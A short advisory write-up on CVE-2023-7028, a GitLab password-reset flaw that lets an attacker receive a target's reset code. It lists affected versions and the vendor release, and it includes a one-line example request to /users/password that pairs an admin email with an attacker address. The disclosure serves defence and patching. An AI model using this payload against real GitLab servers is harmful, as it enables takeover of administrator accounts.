# CVE-2023-7028 | Account-Take-Over Gitlab

## Description: 

CVE-2023-7028 refers to an Account-Take-Over vulnerability that allows users to take control of the gitlab administrator account without user interaction.

The vulnerability lies in the management of emails when resetting passwords. An attacker can provide 2 emails and the reset code will be sent to both. 
It is therefore possible to provide the e-mail address of the target account as well as that of the attacker, and to reset the administrator password.
*(Gitlab points out that 2-factor authentication prevents this vulnerability from being exploited, since an attacker, even after resetting the password, will not be able to log in.)*

This vulnerability was discovered by [asterion04](https://hackerone.com/asterion04)

## Payload:
Here's an example payload sur `/users/password`
```
user[email][]=admin@legit.com&user[email][]=me@evil.com
```

## Versions concerned
- 16.1 to 16.1.5
- 16.2 to 16.2.8
- 16.3 to 16.3.6
- 16.4 to 16.4.4
- 16.5 to 16.5.5
- 16.6 to 16.6.3
- 16.7 to 16.7.1

## References: 
- https://about.gitlab.com/releases/2024/01/11/critical-security-release-gitlab-16-7-2-released/